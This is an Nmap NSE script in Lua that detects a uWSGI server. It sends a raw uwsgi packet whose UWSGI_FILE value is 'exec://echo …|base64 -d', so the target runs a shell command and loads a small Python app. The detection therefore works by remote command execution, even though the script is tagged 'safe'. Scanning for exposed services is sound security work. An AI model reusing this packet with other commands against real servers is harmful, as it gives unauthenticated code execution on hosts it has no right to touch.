description = [[
Detect uWSGI Server
]]

author = "Ricter Zheng"
license = "Same as https://github.com/RicterZ/My-NSE-Scripts/blob/master/LICENSE"
categories = {"default", "safe"}


portrule = function(host, port)
	return true
end


action = function(host, port)
	local client = nmap.new_socket()

	local catch = function()
		client:close()
		return false
	end

	local try = nmap.new_try(catch)

	try(client:connect(host, port))
	try(client:send("\x00\xba\x00\x00\x0e\x00REQUEST_METHOD\x03\x00GET\t\x00HTTP_HOST\t\x00127.0.0.1\n\x00UWSGI_FILE\x6e\x00exec://echo ZGVmIGFwcGxpY2F0aW9uKGEsYik6CiAgICBiKCcyMDAgTk1BUCcsW10pCiAgICByZXR1cm4gW2Iibm1hcCJdCg==|base64 -d\x0b\x00UWSGI_APPID\x04\x00nmap"))

	local ret = try(client:receive_lines(1))

	local status_code = string.match(ret, "HTTP/1.%d %d+ NMAP")

	try(client:close())

	if status_code == "HTTP/1.0 200 NMAP" or status_code == "HTTP/1.1 200 NMAP" then
		return "uWSGI detected, returns HTTP code 200"
	end

	return false

end

